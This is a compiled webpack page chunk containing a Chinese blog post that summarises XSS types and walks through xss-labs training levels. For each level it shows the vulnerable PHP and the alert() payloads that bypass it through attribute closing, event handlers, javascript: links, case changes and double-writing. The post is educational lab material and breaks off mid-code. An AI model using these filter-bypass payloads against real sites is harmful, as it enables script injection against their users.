(window.webpackJsonp=window.webpackJsonp||[]).push([[15],{494:function(t,s,a){"use strict";a.r(s);var n=a(1),r=Object(n.a)({},(function(){var t=this,s=t._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("p",[t._v("本篇博客主要是对常见XSS漏洞的总结")]),t._v(" "),s("blockquote",[s("p",[t._v("注：由于GitHub平台未对博客内容进行过滤，所以本文所有xss代码均进行处理。")]),t._v(" "),s("p",[t._v("请读者自行鉴别")])]),t._v(" "),s("h1",{attrs:{id:"一、xss攻击概述"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#一、xss攻击概述"}},[t._v("#")]),t._v(" 一、XSS攻击概述")]),t._v(" "),s("blockquote",[s("p",[s("strong",[t._v("一、什么是XSS攻击")]),t._v("\nXSS攻击中文名称为：跨站脚本攻击，XSS的重点不在于跨站，而在于脚本的攻击。\nXSS攻击的工作原理：攻击者会在web页面中插入一些恶意的script代码。当用户浏览该页面的时候，那么嵌套在该页面的代码就会执行，因此会达到攻击用户的目的。\nXSS的分类：XSS攻击最主要分为如下几类，反射型，存储型，DOM-based型。反射型和DOM-based型可以归类于非持久性XSS攻击。存储型可以归类于持久性XSS攻击。")])]),t._v(" "),s("h1",{attrs:{id:"二、xss常见类型"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#二、xss常见类型"}},[t._v("#")]),t._v(" 二、XSS常见类型")]),t._v(" "),s("h2",{attrs:{id:"反射型"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#反射型"}},[t._v("#")]),t._v(" 反射型:")]),t._v(" "),s("p",[t._v("​\t\t攻击者发送给被攻击者一个邮件信息或者链接，当被攻击者点击并访问该链接时，此时就会向攻击者的目标服务器发起请求，此时根据请求返回相关的"),s("code",[t._v("script")]),t._v("代码，当浏览器解析这些"),s("code",[t._v("script")]),t._v("代码时，此时代码就会在浏览器执行，造成用户被攻击。")]),t._v(" "),s("p",[t._v("xss-labs题解：")]),t._v(" "),s("h3",{attrs:{id:"_1-直接接受表单传输的值-拼接在html代码中执行"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_1-直接接受表单传输的值-拼接在html代码中执行"}},[t._v("#")]),t._v(" 1.直接接受表单传输的值，拼接在html代码中执行")]),t._v(" "),s("p",[t._v("​\t此时直接输出的php代码就会按照html代码解析执行，类比一下 "),s("code",[t._v('echo "<br>";')])]),t._v(" "),s("div",{staticClass:"language-php extra-class"},[s("pre",{pre:!0,attrs:{class:"language-php"}},[s("code",[s("span",{pre:!0,attrs:{class:"token php language-php"}},[s("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("<?php")]),t._v(" \n"),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("ini_set")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"display_errors"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$str")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_GET")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"name"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("echo")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"<h2 align=center>欢迎用户"')]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$str")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"</h2>"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("?>")])]),t._v("\n")])])]),s("h3",{attrs:{id:"_2-一个函数htmlspecialchars"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_2-一个函数htmlspecialchars"}},[t._v("#")]),t._v(" 2.一个函数\t"),s("strong",[t._v("htmlspecialchars()")])]),t._v(" "),s("h4",{attrs:{id:"定义和用法"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#定义和用法"}},[t._v("#")]),t._v(" 定义和用法")]),t._v(" "),s("p",[t._v("htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。简单的来说，"),s("strong",[t._v("就是将输出时会交给解析的html代码转换为不可执行的字符输出")]),t._v("，从而去避免xss脚本的执行")]),t._v(" "),s("p",[t._v("预定义的字符是：（都成为自己）")]),t._v(" "),s("ul",[s("li",[t._v("& （和号）成为 &")]),t._v(" "),s("li",[t._v('" （双引号）成为 "')]),t._v(" "),s("li",[t._v("' （单引号）成为 '")]),t._v(" "),s("li",[t._v("< （小于）成为 <")]),t._v(" "),s("li",[t._v("> （大于）成为 >")])]),t._v(" "),s("div",{staticClass:"language-php extra-class"},[s("pre",{pre:!0,attrs:{class:"language-php"}},[s("code",[s("span",{pre:!0,attrs:{class:"token php language-php"}},[s("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("<?php")]),t._v(" \n"),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("ini_set")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"display_errors"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$str")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_GET")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"keyword"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("echo")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"<h2 align=center>没有找到和"')]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("htmlspecialchars")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$str")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"相关的结果.</h2>"')]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'<center>\n<form action=level2.php method=GET>//get提交新表单，将str字符实体写入value属性\n<input name=keyword  value=\"'")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$str")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v('\'">\n<input type=submit name=submit value="搜索"/>\n</form>\n</center>\'')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("?>")])]),t._v("\n\n")])])]),s("p",[s("strong",[s("input",{attrs:{name:"keyword",value:"'.$str.'"}})])]),t._v(" "),s("p",[t._v("在这里，只要用脚本将value属性==闭合==，从而使脚本直接插入在html代码（表单）中")]),t._v(" "),s("p",[t._v("("),s("strong",[t._v('==">=='),s("script",[t._v("alert(/(≧▽≦)/)")])]),t._v(")")]),t._v(" "),s("p",[t._v("高亮闭合属性，后面的脚本不变。")]),t._v(" "),s("h3",{attrs:{id:"_3-深入一个函数htmlspecialchars-的传参"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_3-深入一个函数htmlspecialchars-的传参"}},[t._v("#")]),t._v(" 3.深入一个函数htmlspecialchars()的传参：")]),t._v(" "),s("div",{staticClass:"language-php extra-class"},[s("pre",{pre:!0,attrs:{class:"language-php"}},[s("code",[s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$str")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_GET")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"keyword"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("echo")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"<h2 align=center>没有找到和"')]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("htmlspecialchars")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$str")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"相关的结果.</h2>"')]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"<center>\n<form action=level3.php method=GET>\n<input name=keyword  value=\'"')]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("htmlspecialchars")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$str")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"\'>//两次进行实体转换\n<input type=submit name=submit value=搜索 />\n</form>\n</center>"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("?")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n")])])]),s("p",[t._v("可选。规定如何处理引号、无效的编码以及使用哪种文档类型。")]),t._v(" "),s("p",[t._v("可用的引号类型：")]),t._v(" "),s("ul",[s("li",[t._v("ENT_COMPAT - "),s("strong",[t._v("==默认。仅编码双引号==")]),t._v("。")]),t._v(" "),s("li",[t._v("ENT_QUOTES - 编码双引号和单引号。")]),t._v(" "),s("li",[t._v("ENT_NOQUOTES - 不编码任何引号。")])]),t._v(" "),s("p",[t._v("故若第二个参数未设置，则不会转换=="),s("strong",[t._v("单引号")]),t._v("==，但是如果使用常规的**<>**标签仍无法绕过，所以：")]),t._v(" "),s("h5",{attrs:{id:"一个input属性-onclick-避开-的实体化"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#一个input属性-onclick-避开-的实体化"}},[t._v("#")]),t._v(" 一个input属性：onclick，避开<>的实体化")]),t._v(" "),s("h6",{attrs:{id:"定义"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#定义"}},[t._v("#")]),t._v(" "),s("strong",[t._v("定义：")])]),t._v(" "),s("p",[t._v("onclick 事件在用户单击元素时发生。")]),t._v(" "),s("div",{staticClass:"language-php extra-class"},[s("pre",{pre:!0,attrs:{class:"language-php"}},[s("code",[s("span",{pre:!0,attrs:{class:"token php language-php"}},[s("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("<?php")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("echo")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'<input onclick=alert('")]),t._v("wangdengdeng"),s("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("')>'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("?>")])]),t._v("\n")])])]),s("p",[t._v("当单击文本框（input无type属性默认为text）时，执行alert，且需要点击text框去实现，此时alert中须放置数字或者用**/字符串/**")]),t._v(" "),s("p",[t._v("用==/ /==: 因为//构成了正则表达式，也是一个字符串。")]),t._v(" "),s("h5",{attrs:{id:"第二个input属性-onfucus-其实也是通过单击输入框执行js代码"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#第二个input属性-onfucus-其实也是通过单击输入框执行js代码"}},[t._v("#")]),t._v(" 第二个input属性：onfucus，其实也是通过单击输入框执行js代码")]),t._v(" "),s("p",[t._v("这里可以通过"),s("code",[t._v("<input>")]),t._v("标签的一些特殊事件来执行js代码")]),t._v(" "),s("p",[t._v("构造代码："),s("code",[t._v("level3.php?keyword='onfocus=javascript:rt('99') > //&submit=搜索")])]),t._v(" "),s("p",[t._v("' <>")]),t._v(" "),s("h3",{attrs:{id:"_4-黑名单o-n-scr-ipt绕过"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_4-黑名单o-n-scr-ipt绕过"}},[t._v("#")]),t._v(" 4.黑名单o_n\t<scr_ipt绕过")]),t._v(" "),s("p",[t._v("源码：")]),t._v(" "),s("div",{staticClass:"language-php extra-class"},[s("pre",{pre:!0,attrs:{class:"language-php"}},[s("code",[t._v('<?php \nini_set("display_errors", 0);\n$str = strtolower($_GET["keyword"]);\n$str2=str_replace("<script","<scr_ipt",$str);\n$str3=str_replace("on","o_n",$str2);\necho "'),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("h2")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("align")]),s("span",{pre:!0,attrs:{class:"token attr-value"}},[s("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),t._v("center")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v('没有找到和".htmlspecialchars($str)."相关的结果.'),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("h2")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\".'"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("center")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])])]),s("p",[t._v("做一个替换，使脚本失效")]),t._v(" "),s("p",[t._v("绕过方法：")]),t._v(" "),s("div",{staticClass:"language-php+HTML extra-class"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v('("><a href="javascript:alert(/2/)">alert</a> <")\n')])])]),s("p",[t._v("将标签闭合为：")]),t._v(" "),s("div",{staticClass:"language-html extra-class"},[s("pre",{pre:!0,attrs:{class:"language-html"}},[s("code",[t._v('(value="">'),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("a")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("href")]),s("span",{pre:!0,attrs:{class:"token attr-value"}},[s("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("javascript:alert(/admin/)"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("alert"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("a")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v(" "),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v('""')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("//最后闭合)\n")])])]),s("p",[t._v("意为定义a标签的超链接")]),t._v(" "),s("h3",{attrs:{id:"_5-大小写绕过"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_5-大小写绕过"}},[t._v("#")]),t._v(" 5.大小写绕过")]),t._v(" "),s("p",[t._v("绕过：(大小写绕过过滤黑名单的"),s("strong",[t._v("部分")]),t._v("， HrEf也可)")]),t._v(" "),s("div",{staticClass:"language-php+HTML extra-class"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v('("><a HREf="javascript:alert(/4/)">alert</a> <")\n')])])]),s("p",[t._v("大写函数：")]),t._v(" "),s("div",{staticClass:"language-php extra-class"},[s("pre",{pre:!0,attrs:{class:"language-php"}},[s("code",[s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$str")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("strtolower")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_GET")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"keyword"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n")])])]),s("h3",{attrs:{id:"_6-双写绕过"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_6-双写绕过"}},[t._v("#")]),t._v(" 6.双写绕过")]),t._v(" "),s("p",[t._v("双写绕过的原理是str_replace此函数对于敏感字符串只进行一次替换。")]),t._v(" "),s("h3",{attrs:{id:"_7-源码"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_7-源码"}},[t._v("#")]),t._v(" 7.源码：")]),t._v(" "),s("div",{staticClass:"language-php+HTML extra-class"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v('<?php \nini_set("display_errors", 0);\n$str = strtolower($_GET["keyword"]);//小写\n$str2=str_replace("script","scr_ipt",$str);//替换 script、on、src、data、herf、"号\n$str3=str_replace("on","o_n",$str2);\n$str4=str_replace("src","sr_c",$str3);\n$str5=str_replace("data","da_ta",$str4);\n$str6=str_replace("href","hr_ef",$str5);\n$str7=str_replace(\'"\',\'&quot\',$str6);\necho \'<center>\n<form action=level8.php method=GET>\n<input name=keyword  value="\'.htmlspecialchars($str).\'">\n<input type=submit name=submit value=添加友情链接 />\n</form>\n</center>\';\n?>\n<?php\n echo \'<center><BR><a href="\'.$str7.\'">友情链接</a></center>\';\n?>\n<center><img src=level8.jpg></center>\n<?php \necho "<h3 align=center>payload的长度:".strlen($str7)."</h3>";\n?>\n')])])]),s("p",[t._v("首先对于**==”号=="),s("strong",[t._v("进行的过滤导致了value标签无法闭合，双写就失效了。导致的结果是无法构成完整herf，所以进行URL编码（"),s("strong",[t._v("Unicode")]),t._v("）将完整herf转换为编码,执行，恐怕只能用于")]),t._v("链接解析**。")]),t._v(" "),s("h3",{attrs:{id:"_8-源码"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_8-源码"}},[t._v("#")]),t._v(" 8.源码：")]),t._v(" "),s("div",{staticClass:"language-php extra-class"},[s("pre",{pre:!0,attrs:{class:"language-php"}},[s("code",[s("span",{pre:!0,attrs:{class:"token php language-php"}},[s("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("<?php")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token constant boolean"}},[t._v("false")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("===")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("strpos")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$str7")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'http://'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//strpos\t\t对于串第一次出现的位置进行查找")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("echo")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'<center><BR><a href=\"您的链接不合法？有没有！\">友情链接</a></center>'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//常规过滤之后的")]),t._v("\n        "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("else")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("echo")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'<center><BR><a href=\"'")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$str7")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'\">友情链接</a></center>'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("?>")])]),t._v("\n")])])]),s("p",[t._v("绕过：将alert()中换为http://")]),t._v(" "),s("blockquote",[s("p",[t._v("javascript: 是一个伪协议")])]),t._v(" "),s("blockquote",[s("p",[t._v("javascript:是表示在触发"),s("a",[t._v("默认动作时，执行一段JavaScript代码，而 javascript:; 表示什么都不执行，这样点击"),s("a",[t._v("时就没有任何反应。")])])])]),t._v(" "),s("h3",{attrs:{id:"_9-input的新属性"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_9-input的新属性"}},[t._v("#")]),t._v(" 9.input的新属性")]),t._v(" "),s("div",{staticClass:"language-php extra-class"},[s("pre",{pre:!0,attrs:{class:"language-php"}},[s("code",[s("span",{pre:!0,attrs:{class:"token php language-php"}},[s("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("<?php")]),t._v(" \n"),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("ini_set")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"display_errors"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$str")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_GET")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"keyword"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//只向内传递了两个参数")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$str11")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_GET")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"t_sort"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$str22")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("str_replace")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('">"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('""')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$str11")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//对t_sort进行换空处理（否定插入<>）")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$str33")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("str_replace")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"<"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('""')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$str22")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("echo")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"<h2 align=center>没有找到和"')]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("htmlspecialchars")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$str")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"相关的结果.</h2>"')]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v('\'<center>\n<form id=search>\n<input name="t_link"  value="\'')]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v('\'" type="hidden">\n<input name="t_history"  value="\'')]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v('\'" type="hidden">\n<input name="t_sort"  value="\'')]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$str33")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v('\'" type="hidden">\n</form>\n</center>\'')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token delimiter 